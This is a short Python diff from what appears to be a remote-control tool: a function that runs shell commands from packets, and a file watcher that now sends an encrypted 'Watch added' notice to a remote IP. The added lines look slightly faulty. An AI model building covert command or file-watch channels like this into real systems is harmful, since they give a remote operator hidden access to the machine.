@@ -67,7 +67,11 @@ def shellCommand(packet, command):
 def watchAdd(path, ip):
     watch = observer.schedule(FileWatch(ip), path)
     observer.start()
-
+    encrptedMessage = encryption.encrypt(configfile + "Watch added")
+    helpers.sendMessage(encrptedMessage
+                       , configfile. password
+                       , configfile.protocol
+                       , ip)
     try:
         while True:
             time.sleep(1)
